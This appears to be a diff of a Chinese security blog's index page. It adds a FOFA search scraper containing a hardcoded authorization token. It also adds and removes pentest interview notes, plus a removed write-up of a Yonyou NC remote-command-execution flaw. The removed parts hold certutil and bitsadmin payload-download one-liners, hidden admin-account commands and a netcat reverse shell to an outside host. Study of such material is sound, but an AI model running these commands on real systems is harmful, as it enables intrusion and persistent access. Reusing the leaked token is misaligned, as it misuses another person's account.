Firefox/4.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; en) Presto/2.8.131 Version/11.11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; The World)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36&#x27;</span></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">  uaa = random.choice(user_agent_list)</span><br><span class="line">  <span class="comment">#Authorization字段里面有认证信息</span></span><br><span class="line">  header = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;api.fofa.so&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6NzkzMTIsIm1pZCI6MTAwMDQ5Mjk1LCJ1c2VybmFtZSI6ImtyaWxsZXIiLCJleHAiOjE2MjM4ODk1ODguODg2NzU3MSwiaXNzIjoicmVmcmVzaCJ9.zhBsOIeNCWCtv7Tdr0n4m3x2HBkYrzesRB0c5ZUyk7lNgLVmEjQPL-B1QDEmASFJTop05f-Yt7WApIiz3XIa7w&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  header[<span class="string">&#x27;User-Agent&#x27;</span>] = uaa</span><br><span class="line">  print(header)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">run</span>():</span></span><br><span class="line">  keyword = <span class="built_in">input</span>(<span class="string">&quot;输入搜索内容&quot;</span>)</span><br><span class="line">  print(<span class="built_in">type</span>(keyword))</span><br><span class="line">  page = <span class="built_in">input</span>(<span class="string">&quot;输入页数,最多五页，每页10个结果&quot;</span>)</span><br><span class="line">  keyword_base64 = base64.b64encode(keyword.encode())</span><br><span class="line">  url = <span class="string">&#x27;http://api.fofa.so/v1/search?&#x27;</span></span><br><span class="line">  <span class="comment"># 参数写成一个字典</span></span><br><span class="line">  data = &#123;</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: keyword,</span><br><span class="line">    <span class="string">&#x27;qbase64&#x27;</span>: keyword_base64,</span><br><span class="line">    <span class="string">&#x27;full&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pn&#x27;</span>: page,</span><br><span class="line">    <span class="string">&#x27;ps&#x27;</span>: <span class="number">10</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  query_str = parse.urlencode(data);</span><br><span class="line"></span><br><span class="line">  url += query_str</span><br><span class="line">  print(url)</span><br><span class="line">  <span class="comment"># 发送请求</span></span><br><span class="line">  <span class="comment">#构建请求对象</span></span><br><span class="line">  request_ob = request.Request(url=url,headers=getheaders())</span><br><span class="line">  <span class="comment">#发送请求</span></span><br><span class="line">  resp = request.urlopen(request_ob)</span><br><span class="line">  print(resp.read())</span><br><span class="line">  <span class="comment"># filename = keyword + &#x27;.html&#x27;</span></span><br><span class="line">  <span class="comment"># with open(filename, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span></span><br><span class="line">  <span class="comment">#   fp.write(resp.read().decode())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    getheaders()</span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/John-tlh/blog/images/image-20210617023338871.png" alt="image-20210617023338871"></p>
+<p>返回结果中获取了url链接，接下来要做得就是解析返回结果，提取关键信息。先睡了，明天写一下分析以及脚本完善。bb</p>
+<h2 id=""><a href="#" class="headerlink" title=""></a>
+    
+    <a class="article-more-a" href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/06/17/%E6%89%B9%E9%87%8F%E9%87%87%E9%9B%86fofa%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安恒面经整理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h3 id="安恒面经整理："><a href="#安恒面经整理：" class="headerlink" title="安恒面经整理："></a>安恒面经整理：</h3><p><strong>自我介绍：</strong>21岁，大三、哪里人，所学专业，性格活泼外向、从大二开始对安全感兴趣。</p>
+<p><strong>公司做过哪些工作：</strong>略</p>
+<p><strong>知道哪些漏洞：</strong> 系统漏洞（linux、windows）  web漏洞、设备、网络产品漏洞</p>
+<p><strong>web漏洞有哪些：</strong> 语言漏洞（php被黑  被加后门）、web服务器漏洞（apache、nginx、jboss、apache）、cms漏洞、oa产品漏洞、开发框架漏洞、应用漏洞（web应用漏洞、服务器应用漏洞）</p>
+<p><strong>系统层面漏洞有哪些：</strong>windows： SMB远程代码执行、win32k 本地提权漏洞、历史漏洞库。linux： 相对来说少一些。sudo 权限提升漏洞、内核提权漏洞等等</p>
+<p><strong>xss形成原理  是否测试过xss：</strong>测过。原理是没有对用户输入做严格校验与过滤。一般推荐白名单（存在绕过可能），html实体化等等。灰盒测试挖到phpyun 两个xss。</p>
+<p><strong>有参加过ctf比赛ctf负责哪些方面：</strong>没有，但是挖过src，美团高校赛</p>
+<p><strong>sql注入可以达到什么效果：</strong>获取信息（爆库托库）、数据库权限、甚至系统权限   </p>
+<p><strong>udf提权:</strong> 用户定义函数提权。原理：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39683163/article/details/113276587">https://blog.csdn.net/weixin_39683163/article/details/113276587</a></p>
+<p><strong>csrf防御：</strong> 对敏感操作做二次校验，加入随机token 使得攻击者无法冒充合法用户发起恶意请求</p>
+<p><strong>ssrf能达到什么效果：</strong> 内网信息收集 </p>
+<p><strong>脚本能力：</strong> 信息收集的小工具，比如nmap+masscan，cms识别器、小爬虫、数据提取脚本、</p>
+<p><strong>用java做过什么东西：</strong> 学生管理系统（javase）</p>
+<p>中间件反序列化漏洞 <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192063.html">https://www.freebuf.com/articles/web/192063.html</a></p>
+<p>在公司发现过什么漏洞场景：购物app，需要登录，购物车里选择地址，或自己已经有的地址，渗透如何测试，</p>
+<p><strong>还问逻辑漏洞还有哪些：</strong> <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1763568">https://cloud.tencent.com/developer/article/1763568</a></p>
+<p>授权类：</p>
+<p>垂直越权：比如普通用户可以修改管理员的密码</p>
+<p>水平越权：比如可以查看其他用户的订单</p>
+<p>验证码：</p>
+<p>未验证、复用、爆破、篡改服务端返回信息、等等</p>
+<p>业务数据篡改：</p>
+<p>金额、订单数量篡改</p>
+<p>重放攻击：</p>
+<p>用于身份认证</p>
+<p>邮箱短信轰炸：</p>
+<p><strong>sql注入点怎么测：</strong> 测试动态参数、判断程序执行 是成功、失败、waf拦截、forbidden、404、还是什么，进而判断出可能存在的注入点。</p>
+<p><strong>用哪些工具测试：</strong> 熟悉sqlmap的使用即可</p>
+<p><strong>你是从什么时候开始对安全感兴趣的   关注过安全资讯：</strong>大一，freebuf、seebug、公众号、08067、论坛、peiqiwiki、hackmoon、tg等等</p>
+<p><strong>tools有账号么：</strong>有，邮件发了自己一篇漏洞挖掘的笔记，就过了。  </p>
+<p><strong>有挖到过src吗：</strong>有，美团、补天 （好大夫）、公益src、教育src </p>
+<p><strong>linux安全日志位置：</strong>  </p>
+<p><strong>以后打算与发展:</strong> 想往内网（第一选择）或者python安全开发方向（为辅助）走。</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/06/16/%E5%AE%89%E6%81%92%E9%9D%A2%E7%BB%8F%E6%95%B4%E7%90%86/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-python爬虫学习day1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -682,600 +1298,9 @@
 
 
   
-    <article id="post-安洵面试题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="web安全面试题"><a href="#web安全面试题" class="headerlink" title="web安全面试题"></a>web安全面试题</h2><p><strong>1）给你一个目标站，你觉得应该先做什么？</strong></p>
-<p>信息收集（域名子域、真实ip、端口服务探测）</p>
-<p>漏洞发现（漏洞扫描、CMS识别、应用版本识别、poc验证漏洞存在、黑盒测试、源码审计）</p>
-<p>漏洞利用（历史漏洞、EXP利用、能否反弹shell、爆库）</p>
-<p>持续控制（提升权限、维持访问、清除痕迹）</p>
-<p><strong>2）写出下列端口对应的服务？</strong></p>
-<table>
-<thead>
-<tr>
-<th>21</th>
-<th>22</th>
-<th>80</th>
-<th>443</th>
-<th>1433</th>
-<th>3306</th>
-<th>3389</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>telnet</td>
-<td>ssh</td>
-<td>http</td>
-<td>https</td>
-<td>sqlserver</td>
-<td>mysql</td>
-<td><strong>mstsc</strong></td>
-</tr>
-</tbody></table>
-<p><strong>3）常见的上传解析漏洞</strong></p>
-<p><strong>apache：</strong>从右向左（abc.php.xxx.aaa.bbb） -&gt; abc.php</p>
-<p><strong>iis6.0:</strong> </p>
-<p>文件夹名泛解析（aaa.asp文件夹下的a.txt会以asp解析）</p>
-<p>特殊文件名(;.jpg): aaa.asp;.jpg这个文件会以asp方式运行。</p>
-<p><strong>iis7.0、7.5:</strong></p>
-<p>任意文件名.jpg，在后面追加上/任意文件名.php，那么这个文件会以PHP方式来运行 比如<a target="_blank" rel="noopener" href="http://xxxxv/tila.jpg/ccc.php">http://xxxxv/tila.jpg/ccc.php</a> 会以tila.php解析。</p>
-<p><strong>Nginx 解析漏洞：</strong></p>
-<p>任意文件名后面添加xxx.php的方式来运行这个文件</p>
-<p>在文件后面添加%00.php也会以php的方式运行。</p>
-<p><strong>3）域内常用命令</strong></p>
-<p><strong>ipconfig /all</strong>判断是否存在域，<strong>nslookup</strong>判断域控是否与dns服务器在同一服务器上，<strong>net config workstation</strong>查看登录域信息，<strong>net time /domain</strong>查看主域,若是报错或者显示时间，有域控。否则不存在域。</p>
-<p><strong>4）域管账号密码对其他成员执行命令</strong></p>
-<p><strong>5）cmd下远程文件下载</strong></p>
-<p>vb下载：先echo写入vb脚本，然后cscript执行下载脚本</p>
-<p>certutil一句话下载payload：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.1.115/robots.txt</span><br></pre></td></tr></table></figure>
-
-<p>ftp一句话下载payload：先echo写入ftp下载脚本，然后执行ftp -s:xxx</p>
-<p>bitsadmin 下载一句话/payload：bitsadmin /transfer down /download /priority normal ‘<a target="_blank" rel="noopener" href="http://198.13.37.239/nc.exe&#39;">http://198.13.37.239/nc.exe&#39;</a> d:\nc.exe</p>
-<p>js一句话读取/写入文件</p>
-<p>powershell一句话下载payload：powershell.exe -ExecutionPolicy Bypass -File down.ps1</p>
-<p><strong>6）抓包改包</strong></p>
-<p>burp、fiddle、charles</p>
-<p><strong>7）常见的web容器</strong></p>
-<p>IIS,APACHE,NGINX,TOMCAT,WEBLOGIC,DJANGO,JBOSS</p>
-<p><strong>8) 快速判断目标服务器是Windows还是linux</strong></p>
-<p>是否大小写敏感</p>
-<p><strong>9）常见的Windows提权方法</strong></p>
-<p>1）syteminfo查看补丁信息，查找exp（内核提权）</p>
-<p>2）mssql提取、udf提权</p>
-<p>3）Windows系统配置错误提权(dll劫持、<strong>注册表键AlwaysInstallElevated</strong>、<strong>可信任服务路径漏洞</strong>、自动安装配置文件*、计划任务)</p>
-<ol start="4">
-<li>bypass uac</li>
-</ol>
-<p><strong>10）下列端口对应的服务</strong></p>
-<table>
-<thead>
-<tr>
-<th>873</th>
-<th>5000</th>
-<th>5900</th>
-<th>1521</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>rsync文件同步</td>
-<td></td>
-<td>vnc远程</td>
-<td>oracle</td>
-</tr>
-</tbody></table>
-<p><strong>11) .htaccess 文件配置jsp文件解析为php</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
-
-<p><strong>12) csrf ,ssrf .以及重放攻击的区别</strong></p>
-<p>重放攻击：以登录业务为例（不具备身份，但是有认证信息）</p>
-<p>csrf：以添加用户为例（已经有了一个身份、用户或者是管理员）</p>
-<p>ssrf： 伪造服务端发送请求，探测内网</p>
-<p><strong>13）windows下添加本地账户以及加入到管理员组的命令</strong></p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user whoami$ Liu78963 /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators whoami$ /add</span><br></pre></td></tr></table></figure>
-
-<p><strong>14) windows下&gt;与&gt;&gt;的区别：</strong>写入（会覆盖）与追加</p>
-<p><strong>15）常见的javaweb应用以及框架</strong></p>
-<p><strong>Hibernate、Struts2、MyBatis、Spring、spring MVC</strong> </p>
-<p><strong>16）mysql 导出文件的命令</strong></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump 数据库名 <span class="comment">--host=主机 --port=端口 -u用户名 -p密码 --where=&quot;过滤条件&quot; --tables 数据表 &gt; 导出文件路径.sql</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>17）缓冲区溢出</strong></p>
-<p><strong>18）DNS域传送</strong>漏洞复现命令</p>
-<p><strong>19）nmap 默认扫描哪些端口</strong></p>
-<p>默认情况下，Nmap用指定的协议对端口1到1024以及<code>nmap-services</code> 文件中列出的更高的端口在扫描。</p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/06/09/%E5%AE%89%E6%B4%B5%E9%9D%A2%E8%AF%95%E9%A2%98/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-CNVD-2021-30193 " class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2021/06/09/CNVD-2021-30193%20/">从命令执行到getshell</a>
-	
-    </h1>
-  
-
-
-  
-  
-<a href="/2021/06/09/CNVD-2021-30193%20/" class="archive-article-date">
-        <time datetime="2021-06-09T07:22:19.665Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-09</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h2 id="CNVD-2021-30193-从命令执行到getshell"><a href="#CNVD-2021-30193-从命令执行到getshell" class="headerlink" title="CNVD-2021-30193 从命令执行到getshell"></a>CNVD-2021-30193 从命令执行到getshell</h2><h3 id="漏洞简介：用友-NC-bsh-servlet-BshServlet-远程命令执行漏洞"><a href="#漏洞简介：用友-NC-bsh-servlet-BshServlet-远程命令执行漏洞" class="headerlink" title="漏洞简介：用友 NC bsh.servlet.BshServlet 远程命令执行漏洞"></a>漏洞简介：<strong>用友 NC bsh.servlet.BshServlet 远程命令执行漏洞</strong></h3><p>用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限</p>
-<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210609160221270.png" alt="image-20210609160221270"></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先考虑反弹一个稳定的shell。目标主机是Win2012这里选择使用nc,但是目标主机上没有，所以需要先下载下来。</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://198.xx.xx.xx/nc.exe d:\\xxh.exe</span><br></pre></td></tr></table></figure>
-
-<p>服务端开启监听之后再执行：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d:\\xxh.exe 198.xx.xx.xxx 1988 -e c:\\windows\\system32\\cmd.exe</span><br></pre></td></tr></table></figure>
-
-<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>可以看到，目标机已经建立起连接。</p>
